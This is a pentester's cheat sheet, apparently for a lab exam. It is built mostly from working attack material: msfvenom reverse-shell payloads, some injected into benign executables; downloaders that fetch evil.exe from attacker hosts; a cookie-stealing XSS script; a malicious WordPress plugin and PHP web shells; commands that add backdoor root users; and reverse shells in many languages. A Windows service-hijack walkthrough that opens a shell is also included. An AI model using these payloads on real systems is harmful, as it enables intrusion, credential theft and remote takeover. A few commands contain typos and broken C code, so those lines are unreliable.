
+++++++++___
++ ((-))  o - - ___ 
+++++++++__|     o - -___
                       o \
^^^^^^^^^^^^^^^^^^^^^^^^^^


---------------> full port scans
------------------------------------> unicornscan -mT 10.1.1.10:1-65535
------------------------------------> unicornscan -mU 10.1.1.10:1-65535

---------------> enumerate open services/find attack vectors
------------------------------------> GOOGLE
------------------------------------> nmap -sV 10.1.1.10 -p 22,23,135,etc
------------------------------------> nmap -sC 10.1.1.10 -p 22,25,8080,etc
------------------------------------> nmap --script ftp-anon.nse 10.1.1.10 -p21
------------------------------------> nmap --script smb-enum-shares.nse <target>ip
------------------------------------> smbclient //HOSTNAME/SHARENAME -I <targetip> -N
------------------------------------> rpcclient -U "" <targetip>
------------------------------------> enum4linux (kinda sucks)
------------------------------------> nbtscan -r <targetip>
------------------------------------> curl -I http://targetip/
------------------------------------> curl http://targetIISserver/_vti_pvt/access.cnf  <<< credentials stored here
------------------------------------> davtest -cleanup -url http://targetip/
------------------------------------> manual source code inspection - web inspector
------------------------------------> cadaver http://targetip/
------------------------------------> ./PUTTr <targetip> (this is a custom script)
------------------------------------> nikto -C all -h http://targetip/
------------------------------------> nikto -h example.com -Display V -F htm -output niktoscan.html	#HTML output from Nikto scan
------------------------------------> mikdir <resultsfolder> && skipfish -b i -o <resultsfolder> http://targetip/
------------------------------------> dirb http://targetip/
------------------------------------> dirb http://targetip/ /usr/share/dirb/wordlists/big.txt -x /usr/share/dirb/wordlists/extensions_common.txt -w 800
------------------------------------> dotdotpwn -m http-url -u http://10.11.1.8/internal/index.php?ACS_path=TRAVERSAL -k /etc/passwd -o unix
------------------------------------> dotdotpwn -m ftp -h 10.1.1.10 -t 1000 -f boot.ini -k timeout
------------------------------------> wpscan -r -t 4 --url http://targetip/rootwordpressdirectory/ -e vp
------------------------------------> http://targetip/?author=1   #enumerate Wordpress users
------------------------------------> TamperData
------------------------------------> SQL injection
------------------------------------> proxychains dotdotpwn -m http -h 10.1.1.10 -o unix -t 1000 2>/dev/null
------------------------------------> nc -nv <targetip> <targetport>
------------------------------------> GOOGLE MORE

---------------> privilege escalation
------------------------------------> Linux/Unix
---------------------------------------------------> Get kernel + OS version 
------------------------------------------------------------------> cat /proc/version
------------------------------------------------------------------> uname -a
------------------------------------------------------------------> cat /etc/*-release
------------------------------------------------------------------> cat /etc/lsb-release      # Debian based
------------------------------------------------------------------> cat /etc/redhat-release   # Redhat based
------------------------------------------------------------------> cat /etc/issue
---------------------------------------------------> Networking/Connections
------------------------------------------------------------------> lsof -i
------------------------------------------------------------------> netstat -antpu
------------------------------------------------------------------> ifconfig
------------------------------------------------------------------> ip addr
------------------------------------------------------------------> arp -a
------------------------------------------------------------------> finger
---------------------------------------------------> Spawn more stable shell
------------------------------------------------------------------> python -c 'import pty;pty.spawn("/bin/bash");'
------------------------------------------------------------------> perl -e 'system("/bin/bash");'
---------------------------------------------------> Check running processes/configurations
------------------------------------------------------------------> ps aux | grep root
------------------------------------------------------------------> ps -ef | grep root
------------------------------------------------------------------> crontab -l
------------------------------------------------------------------> cat /etc/fstab
------------------------------------------------------------------> env
------------------------------------------------------------------> echo #PATH
---------------------------------------------------> Search the file system
------------------------------------------------------------------> Find path to binary (if you have a weird $PATH set)
---------------------------------------------------------------------------------> which <cmdname>
------------------------------------------------------------------> Check interesting/hidden files
---------------------------------------------------------------------------------> ls -lah
---------------------------------------------------------------------------------> cat /etc/passwd
---------------------------------------------------------------------------------> ls -l /etc/passwd
---------------------------------------------------------------------------------> ls -l
---------------------------------------------------------------------------------> cat /etc/group
---------------------------------------------------------------------------------> cat /etc/mysql/debian.cnf
---------------------------------------------------------------------------------> cat /etc/fstab
---------------------------------------------------------------------------------> head /var/mail/root
---------------------------------------------------------------------------------> grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'
---------------------------------------------------------------------------------> find . -name "*.php" -print0 | xargs -0 grep -i -n "password"
---------------------------------------------------------------------------------> find . -name "*.conf*" -print0 | xargs -0 grep -i -n "pass"
------------------------------------------------------------------> Find SUID files
---------------------------------------------------------------------------------> find / -perm -4000 -type f 2>/dev/null
---------------------------------------------------------------------------------> find / -uid 0 -perm -4000 -type f 2>/dev/null
------------------------------------------------------------------> Find SGID files (run as the group, not the user who started it)
----------------------------------------------------------------------------------> find / -perm -g=s -type f 2>/dev/null
------------------------------------------------------------------> Find writable files, directories
----------------------------------------------------------------------------------> find / -writable -type d 2>/dev/null
----------------------------------------------------------------------------------> find . -writable -type f 2>/dev/null
----------------------------------------------------------------------------------> find / -perm -o x -type d 2>/dev/null
----------------------------------------------------------------------------------> find / \( -perm -o w -perm -o x \) -type f 2>/dev/null
------------------------------------------------------------------> Find sticky bits (only the owner of the directory or the owner of a file has access to it)
----------------------------------------------------------------------------------> find / -perm -1000 -type d 2>/dev/null
------------------------------------------------------------------> Find abandoned files (no owner)
----------------------------------------------------------------------------------> find /dir -xdev \( -nouser -o -nogroup \) -print
------------------------------------------------------------------> Check if any binaries can be run as root, or if user, or other users might be a sudoer
----------------------------------------------------------------------------------> sudo -l 2>/dev/null | grep -w 'nmap|perl|'awk'|'find'|'bash'|'sh'|'man'|'more'|'less'|'vi'|'vim'|'nc'|'netcat'|python|ruby|lua|irb' | xargs -r ls -la 2>/dev/null
----------------------------------------------------------------------------------> sudo su
----------------------------------------------------------------------------------> su <otheruser> && sudo su
---------------------------------------------------> Automated Enumeration + exploit suggestion
----------------------------------------------------------------------------------> linuxprivchecker.py
----------------------------------------------------------------------------------> LinEnum.sh
------------------------------------> Windows
---------------------------------------------------> Get OS type and information
------------------------------------------------------------------> systeminfo
----------------------------------------------------------------------------------> # Copy the output of the "systeminfo" command into a TXT file, then use windows exploit suggester to ID possible exploits
----------------------------------------------------------------------------------> root@kali:~# python windows-exploit-suggester.py --database 2017-06-14-mssb.xls --systeminfo info.txt
------------------------------------------------------------------> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System type"
------------------------------------------------------------------> set
------------------------------------------------------------------> DRIVERQUERY
------------------------------------------------------------------> net use
------------------------------------------------------------------> net user
---------------------------------------------------> List all tasks, their PIDs, and related services
------------------------------------------------------------------> tasklist /SVC /FO CSV
------------------------------------------------------------------> sc query | findstr SERVICE_NAME
------------------------------------------------------------------> sc qc <servicename>
------------------------------------------------------------------> Check for unquoted service paths and weak service permissions
----------------------------------------------------------------------------------> wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
----------------------------------------------------------------------------------> accesschk.exe /accepteula -uwcqv "Authenticated Users" *
----------------------------------------------------------------------------------> accesschk.exe /accepteula -uwcqv "<currentUsername>" *
---------------------------------------------------> Networking  and connections
------------------------------------------------------------------> ipconfig /all
------------------------------------------------------------------> ipconfig /displaydns
------------------------------------------------------------------> netstat -nao
------------------------------------------------------------------> netstat -na
------------------------------------------------------------------> net view
------------------------------------------------------------------> net view /domain
------------------------------------------------------------------> net user /domain
------------------------------------------------------------------> net localgroup administrators
------------------------------------------------------------------> net group "Enterprise Admins" /domain
------------------------------------------------------------------> net group "Domain Admins" /domain
------------------------------------------------------------------> net group "Domain Controllers" /domain
------------------------------------------------------------------> net share
------------------------------------------------------------------> arp -a
------------------------------------------------------------------> Disable/Enable Windows firewall
----------------------------------------------------------------------------------> netsh firewall set opmode disable
----------------------------------------------------------------------------------> netsh firewall set opmode enable
-------------------------------------------------------------------> Enable Remote Desktop Connections
----------------------------------------------------------------------------------> reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
----------------------------------------------------------------------------------> netsh firewall set service remoteadmin enable
----------------------------------------------------------------------------------> netsh firewall set service remotedesktop enable
---------------------------------------------------> Search the file system
------------------------------------------------------------------> Search for filename matching a pattern and print its full path
----------------------------------------------------------------------------------> dir /s /b | findstr /I searchpattern
----------------------------------------------------------------------------------> dir /s *pass* == *cred* == *vnc* == *.config*
------------------------------------------------------------------> Go to writable directory
----------------------------------------------------------------------------------> cd %temp%
------------------------------------------------------------------> Search for files containing passwords
----------------------------------------------------------------------------------> findstr /si pwd= *.xml *.ini *.txt 
----------------------------------------------------------------------------------> findstr /si password= *.xml *.ini *.txt
----------------------------------------------------------------------------------> findstr /si pass= *.xml *.ini *.txt
----------------------------------------------------------------------------------> reg query HKLM /f password /t REG_SZ /s
----------------------------------------------------------------------------------> reg query HKCU /f password /t REG_SZ /s
----------------------------------------------------------------------------------> reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"
------------------------------------------------------------------> Check permissions for a file
----------------------------------------------------------------------------------> cacls C:\WINDOWS\system32\alg.exe
----------------------------------------------------------------------------------> icacls C:\WINDOWS\system32\alg.exe
------------------------------------------------------------------> Look for interesting files/folders
----------------------------------------------------------------------------------> C:\Windows\SYSVOL
----------------------------------------------------------------------------------> \etc\hosts
----------------------------------------------------------------------------------> ultravnc.ini
----------------------------------------------------------------------------------> Groups.xml/Group.xml
----------------------------------------------------------------------------------> sysprep.xml
----------------------------------------------------------------------------------> sysprep.inf
----------------------------------------------------------------------------------> ultravnc.ini / *vnc.ini
----------------------------------------------------------------------------------> C:\Windows\Panther
----------------------------------------------------------------------------------> Unattend*xml*
----------------------------------------------------------------------------------> windows/repair/SAM
----------------------------------------------------------------------------------> /windows/repair/system
---------------------------------------------------> Adding/Modifying Users/Rebooting
------------------------------------------------------------------> Add a new Admin user with RDP privileges
----------------------------------------------------------------------------------> net user greg gregspassword /add
----------------------------------------------------------------------------------> net localgroup "Administrators" greg /add
----------------------------------------------------------------------------------> net localgroup "Remote Desktop Users" greg /add
------------------------------------------------------------------> Reboot the system
----------------------------------------------------------------------------------> shutdown /r /t 0
----------------------------------------------------> Automated enumeration tools + Exploit suggesters
------------------------------------------------------------------> Jollyfrog's root loot script
------------------------------------------------------------------> windows_exploit_suggester.py
------------------------------------------------------------------> Pentestmonkey's windows-priv-esc-check2.exe / windows_privesc_check.py

---------------> MSFvevom shells/tricks
------------------------------------> msfvenom -p linux/x86/shell_reverse_tcp lhost=10.11.0.78 lport=3333 exitfunc=thread -b "\x00\x0a\x0d" -f elf -o shel
------------------------------------> msfvenom -a x86 -p windows/meterpreter/reverse_nonx_tcp lhost=10.11.0.78 lport=21 exitfunc=thread -f raw > shelc0de
------------------------------------> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.155 LPORT=25 -f jsp > guccsauce.jsp
------------------------------------> msfvenom -p php/reverse_php LHOST=10.11.0.155 LPORT=25 -f raw > shell.php.test
------------------------------------> msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.78 LPORT=2222 -b "\x00\x0a\x0d" -f asp > webshell
------------------------------------> cat payload | msfvenom --platform windows -a x86 -p- -b "\x00" -f python					# read a payload fromm stdin
------------------------------------> msfvenom -x /usr/share/windows-binaries/plink.exe -k -p windows/meterpreter/reverse_tcp lhost=10.11.0.78 lport=4444 -b "\x00\x0a\x0d" -f dll -i 2 -o evil.exe		#inject payload into benign EXE
------------------------------------> msfvenom -a x86 --platform windows -x plink.exe -k -p windows/shell_reverse_tcp LHOST=10.11.0.155 LPORT=443 -i 4 -f exe -o plink_injected.exe				#same thing as above

---------------> Powershell Tricks
------------------------------------> Write a simple downloader to disk
---------------------------------------------------> echo $storageDir = $pwd > wget.ps1
---------------------------------------------------> echo $webclient = New-Object System.Net.WebClient >> wget.ps1
---------------------------------------------------> echo $url = "http://10.1.1.50/nc.exe" >>wget.ps1
---------------------------------------------------> echo $file = "nc.exe" >> wget.ps1
---------------------------------------------------> echo $webclient.DownloadFile($url,$file) >>wget.ps1
------------------------------------> Execute a powershell script from cmd
---------------------------------------------------> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
------------------------------------> Execute commands using stolen credentials (download/exec reverse shell in this example)
---------------------------------------------------> $storageDir = $pwd
---------------------------------------------------> $webclient = New-Object System.Net.WebClient
---------------------------------------------------> $url = "http://10.1.1.50/nc.exe"
---------------------------------------------------> $file = "nc.exe"
---------------------------------------------------> $webclient.DownloadFile($url,$file)
---------------------------------------------------> $username = 'WORKGROUP\john'
---------------------------------------------------> $password = 'johnspassword123'
---------------------------------------------------> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
---------------------------------------------------> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
---------------------------------------------------> $evil = "C:\Users\Bethany\Downloads\nc.exe"
---------------------------------------------------> start-Process -FilePath $evil -ArgumentList '-nv','10.1.1.50','445','-e','cmd.exe' -Credential $credential
------------------------------------> Execute arbitrary Powershell commands from cmd
---------------------------------------------------> powershell -Command "echo Hey"

---------------> Miscellaneous
------------------------------------> To avoid problems running an EXE within a limited/restricted shell, execute it from .bat file
--------------------------------------------------> echo fgdump.exe > dump.bat
--------------------------------------------------> dump.bat
------------------------------------> Online PW attack
--------------------------------------------------> medusa -H ftptargs -U users -M ftp -t 4 -T 4 -F -L  -P /usr/share/wordlists/fasttrack.txt
--------------------------------------------------> hydra -l <username> -P wordlist -u  -s 3389  -M 10.1.1.10 rdp
------------------------------------> Setup DoublePulsar
--------------------------------------------------> Instructions here: https://github.com/gh0stsec/Eternalblue-Doublepulsar-Metasploit/blob/master/README.md
--------------------------------------------------> root@kali:~# cd /usr/share/metasploit-framework/modules/exploits/windows/smb/
--------------------------------------------------> root@kali:/usr/share/metasploit-framework/modules/exploits/windows/smb# git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
------------------------------------> Write VBS Downloader (for older windows systems) to disk
--------------------------------------------------> echo strUrl = WScript.Arguments.Item(0) > wget.vbs
--------------------------------------------------> echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
--------------------------------------------------> echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
--------------------------------------------------> echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
--------------------------------------------------> echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
--------------------------------------------------> echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
--------------------------------------------------> echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
--------------------------------------------------> echo Err.Clear >> wget.vbs
--------------------------------------------------> echo Set http = Nothing >> wget.vbs
--------------------------------------------------> echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
--------------------------------------------------> echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
--------------------------------------------------> echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
--------------------------------------------------> echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
--------------------------------------------------> echo http.Open "GET",strURL,False >> wget.vbs
--------------------------------------------------> echo http.Send >> wget.vbs
--------------------------------------------------> echo varByteArray = http.ResponseBody >> wget.vbs
--------------------------------------------------> echo Set http = Nothing >> wget.vbs
--------------------------------------------------> echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
--------------------------------------------------> echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
--------------------------------------------------> echo strData = "" >> wget.vbs
--------------------------------------------------> echo strBuffer = "" >> wget.vbs
--------------------------------------------------> echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
--------------------------------------------------> echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
--------------------------------------------------> echo Next >> wget.vbs
--------------------------------------------------> echo ts.Close >> wget.vbs
------------------------------------> Execute the VBS downloader
--------------------------------------------------> cscript wget.vbs http://10.1.1.10/evil.exe evil.exe
------------------------------------> Install Serpico Reporting tool on Kali
--------------------------------------------------> apt-get update
--------------------------------------------------> apt-get install libsqlite3-dev libxslt-dev libxml2-dev
--------------------------------------------------> git clone https://github.com/SerpicoProject/Serpico.git
--------------------------------------------------> cd Serpico && bundle install
--------------------------------------------------> ruby scripts/first_time.rb		# Take note of the admin password that is generated in this step
--------------------------------------------------> ruby serpico.rb			# This starts serpico, it will be available on 0.0.0.0:8443
--------------------------------------------------> https://127.0.0.1:8443		# log in using the admin credentials

---------------> HTML/JavaScript/PHP/WordPress Tricks
------------------------------------> Basic HTML Page 
---------------------------------------------------> <!DOCTYPE html>
---------------------------------------------------> <html>
---------------------------------------------------> <body>
---------------------------------------------------> <h1>My First Heading</h1>
---------------------------------------------------> <p>My first paragraph.</p>
---------------------------------------------------> </body>
---------------------------------------------------> </html>
-------------------------------------> JavaScript XSS test - popup
---------------------------------------------------> <script> alert('XSS here') ; </script>
-------------------------------------> JavaScript cookie stealer/iframe
---------------------------------------------------> <script> new Image().src="http://10.1.1.155:81/random/"+document.cookie;</script>
---------------------------------------------------> <iframe SRC="http://10.1.1.155/random/" height = "0" width = "0"></iframe>
---------------------------------------------------> <iframe SRC="http://10.1.1.155/things/"+document.cookie height=0 width=0 ></iframe>
-------------------------------------> Inject iframe into dynamic webpage via MySQL
---------------------------------------------------> mysql> update wp_posts set post_content = '<script>window.location="http://10.1.1.10/evil.html"</script>' where guid = "http://10.1.1.234/?p=1";
-------------------------------------> Malicious Wordpress plugin (need to put this into a ZIP file)
---------------------------------------------------> <?php
--------------------------------------------------->  /*
--------------------------------------------------->  Plugin Name: Great Plugin
--------------------------------------------------->  Plugin URI: www.google.com
--------------------------------------------------->  Description: Converts water to Boron
--------------------------------------------------->  Author: Girth Brookz
--------------------------------------------------->  Version: 1.0
--------------------------------------------------->  Author URI: www.google.com
--------------------------------------------------->  */
--------------------------------------------------->  echo(system($_GET["cmd"]));
---------------------------------------------------> ?>
--------------------------------------> Basic PHP web shells
---------------------------------------------------> <?php echo shell_exec($_GET['cmd']);?>
---------------------------------------------------> <?php echo passthru($_GET[xxx]) ?>
---------------------------------------------------> <?php echo(system($_GET["cmd"])); ?>
--------------------------------------> Query local MySQL DB from restricted shell using PHP script
---------------------------------------------------> # this script was used to empty password hashes from the "users" table of a mysql database.
---------------------------------------------------> <?php
---------------------------------------------------> $sql_prefix = '';
---------------------------------------------------> $sql_host = 'localhost';
---------------------------------------------------> $sql_user =  'root';
---------------------------------------------------> $sql_pass = 'sillydbpassword123';
---------------------------------------------------> $sql_db = 'webb_app';
---------------------------------------------------> mysql_connect(localhost,$sql_user,$sql_pass);
---------------------------------------------------> @mysql_select_db($sql_db) or die("Failed to connect to DB");
---------------------------------------------------> $query = "SELECT * FROM users;";
---------------------------------------------------> $result = mysql_query($query);
---------------------------------------------------> $result = mysql_query($query);
---------------------------------------------------> $values = mysql_fetch_array($result);
---------------------------------------------------> echo var_dump($values);
---------------------------------------------------> mysql_close();
---------------------------------------------------> ?>

---------------> Python/Perl/Bash/C Tricks
------------------------------------> Write a Windows-friendly Python downloader to disk
---------------------------------------------------> echo import urllib > f.py
---------------------------------------------------> echo urllib.urlretrieve("http://10.11.0.78:53/fgdump.exe", "fg.exe") >> f.py
------------------------------------> One-liner version of the Python downloader above (Windows/Linux)
---------------------------------------------------> python -c 'import urllib;urllib.urlretrieve("http://trizzle.ddns.net/evil.exe", "evil.exe")'
------------------------------------> Add new root user (Perl and Python)
---------------------------------------------------> perl -e 'exec("useradd -o -u 0 -g 0 -m -s /bin/bash greg; echo greg:gregpass | chpasswd");'
---------------------------------------------------> python -c 'import os;os.system("useradd -o -u 0 -g 0 -m -s /bin/bash greg; echo greg:gregpass | chpasswd");'
------------------------------------> Perl CGI reverse shell
---------------------------------------------------> #!/usr/bin/perl -w
---------------------------------------------------> print "content-type: text/html\n\n";
---------------------------------------------------> exec "bash -i >& /dev/tcp/10.1.1.10/4444 0>&1";
------------------------------------> Simple (Mostly universal) Perl downloader
---------------------------------------------------> #!/usr/bin/perl
---------------------------------------------------> use File::Fetch;
---------------------------------------------------> my $url = "http://10.1.1.10:53/x";
---------------------------------------------------> my $ff = File::Fetch->new(uri => $url);
---------------------------------------------------> my $file = $ff->fetch() or die $ff->error;
------------------------------------> Create a setuid program
---------------------------------------------------> Compile the following C code
------------------------------------------------------------------> #include <stdio.h>
------------------------------------------------------------------> #include <stdlib.h>
------------------------------------------------------------------> #include <sys/types.h>
------------------------------------------------------------------> #include unistd.h>
------------------------------------------------------------------> int main() {
------------------------------------------------------------------>    setuid(0);
------------------------------------------------------------------>    setguid(0);
------------------------------------------------------------------>    system("/bin/sh");
------------------------------------------------------------------>    return 0;
------------------------------------------------------------------> }
---------------------------------------------------> Change the owner to root (or whatever user you want to execute a shell as)
------------------------------------------------------------------> chown root:root my_suid_program
---------------------------------------------------> Configure the permissions to anyone can execute the file (also add the sticky bit). Suid is now ready.
------------------------------------------------------------------> chmod 777 my_suid_program
------------------------------------------------------------------> chmod +s my_suid_program

---------------> Reverse Shells
------------------------------------> PHP-based reverse shells
---------------------------------------------------> <?php $x = `mkfifo /tmp/wtf;cat /tmp/wtf | /bin/sh -i 2>&1 |telnet 10.1.1.10 443 >/tmp/wtf;`; echo $x; ?>
---------------------------------------------------> <?php shell_exec('echo "sh -i >& /dev/tcp/10.1.1.10/443 0>&1" > /tmp/wtf.sh; /bin/bash /tmp/wtf.sh &'); ?>
---------------------------------------------------> <?php echo shell_exec('sleep 7; /bin/bash -i >& /dev/tcp/10.1.1.10/443 0>&1'); ?>
---------------------------------------------------> php -r '$sock=fsockopen("10.1.1.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
------------------------------------> Bash/sh reverse shells
---------------------------------------------------> /bin/bash -i >& /dev/tcp/10.1.1.10/4444 0>&1
---------------------------------------------------> /bin/sh -i >& /dev/tcp/10.1.1.10/4444 0>&1
------------------------------------> Netcat reverse shells (Linux + Windows)
---------------------------------------------------> nc -nv 10.1.1.10 443 -e /bin/bash
---------------------------------------------------> nc -nv 10.1.1.10 443 -e cmd.exe
---------------------------------------------------> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.78 4444 >/tmp/f
------------------------------------> Perl reverse shell
---------------------------------------------------> perl -e 'use Socket;$i="10.1.1.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
------------------------------------> Python reverse shell
---------------------------------------------------> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.78",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
------------------------------------> Ruby reverse shell
---------------------------------------------------> ruby -rsocket -e'f=TCPSocket.open("10.1.1.10",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
------------------------------------> Java reverse shell
---------------------------------------------------> r = Runtime.getRuntime()
---------------------------------------------------> p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
---------------------------------------------------> p.waitFor()
------------------------------------> Xterm reverse shell
---------------------------------------------------> Xnest :1				#start X-server on port 6001
---------------------------------------------------> xhost +victimIP			#allow the reverse shell to your box
---------------------------------------------------> xterm -display attackerIP:1	#send the reverse shell from the victim back to your attacking box
--------------------------------------------------------------------------------------------------------------------------------->>>>>>>>>>>>>>>>>>>>>>>>>


*** Time saving trick for writing downloaders to disk ***

root@kali:~# cat wget.vbs | tr '\n' '~' | sed 's/~/ \&\& /g' | tr '~' '\n'

echo strUrl = WScript.Arguments.Item(0) > wget.vbs && echo StrFile = WScript.Arguments.Item(1) >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs && echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs && echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs && echo Err.Clear >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs && echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs && echo http.Open "GET",strURL,False >> wget.vbs && echo http.Send >> wget.vbs && echo varByteArray = http.ResponseBody >> wget.vbs && echo Set http = Nothing >> wget.vbs && echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs && echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs && echo strData = "" >> wget.vbs && echo strBuffer = "" >> wget.vbs && echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs && echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs && echo Next >> wget.vbs && echo ts.Close >> wget.vbs

*** this translates it into one long commmand that can be copied and pasted - write the downloader to disk with one fell swoop ***

---------------------------------------------------------------------------------------------------------------------------------
# Reconfigure & pwn weak service permissions: requres accesschk.exe
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
# Find services you have access to
C:\> accesschk.exe /accepteula -uwcqv "ted" *

RW SSDPSRV
	SERVICE_ALL_ACCESS
RW upnphost
	SERVICE_ALL_ACCESS

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
# Get more info
C:\> sc qc upnphost

[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : NT AUTHORITY\LocalService  

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
# Generate an evil payload of some sort and reconfigure the service to run it (payload can also be simple commands)

# Remove the service's dependency to avoid errors
C:\> sc config upnphost depend= ""
[SC] ChangeServiceConfig SUCCESS

# Need to look up wtf this part does but type dis:
C:\> sc config upnphost obj= ".\LocalSystem" password= ""
[SC] ChangeServiceConfig SUCCESS

# Get the service to add a user for us
C:\> sc config upnphost binpath= "net user greg Greggy123 /add"
[SC] ChangeServiceConfig SUCCESS

# Run the service
C:\> net start upnphost
The service is not responding to the control function.
More help is available by typing NET HELPMSG 2186.

# Check to see that our new user Greg has been created
C:\> net user
User accounts for \\<hostname>
Administrator            ted                      greg                     
Guest                    HelpAssistant            IUSR_BOB                 
IWAM_BOB                 SUPPORT_388945a0         

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
# Same thing as above, except we execute a reverse shell w/ netcat

C:\Inetpub\wwwroot>sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv 10.1.1.50 443 -e cmd.exe"
[SC] ChangeServiceConfig SUCCESS

C:\Inetpub\wwwroot>net start upnphost
..
..
root@kali:~/Desktop/Xdev# nc -lvp 443
listening on [any] 443 ...
10.1.1.10: inverse host lookup failed: Unknown host
connect to [10.1.1.50] from (UNKNOWN) [10.1.1.10] 3006
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
# Same thing as above, except we execute a threaded reverse cmd shell (this is the best way)

# Generate semi-stealthy reverse shell payload, inject it into nc.exe
root@kali:~# msfvenom -a x86 -p windows/shell_reverse_tcp lhost=10.1.1.50 lport=443 exitfunc=thread -x nc.exe -f exe -o evil.exe

# Once it is uploaded, set the binpath
C:\> sc config upnphost binpath= "C:\Inetpub\wwwroot\evil.exe"
[SC] ChangeServiceConfig SUCCESS

# Execute it and obtain our reverse shell
C:\> net start upnphost
The service is not responding to the control function.
More help is available by typing NET HELPMSG 2186.
..
..
root@kali:~/Desktop/Xdev# nc -lvp 443
listening on [any] 443 ...
10.1.1.10: inverse host lookup failed: Unknown host
connect to [10.1.1.50] from (UNKNOWN) [10.1.1.10] 3007
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

---------------------------------------------------------------------------------------------------------------------------------
# Accesschk commandz

accesschk.exe /accepteula -uwqs "Everyone" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*."
accesschk.exe /accepteula -uwqs "Users" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*."
accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*  | findstr /VI \.*System.Volume.Information*. | findstr /VI \.*Documents.And.Settings*.

---------------------------------------------------------------------------------------------------------------------------------


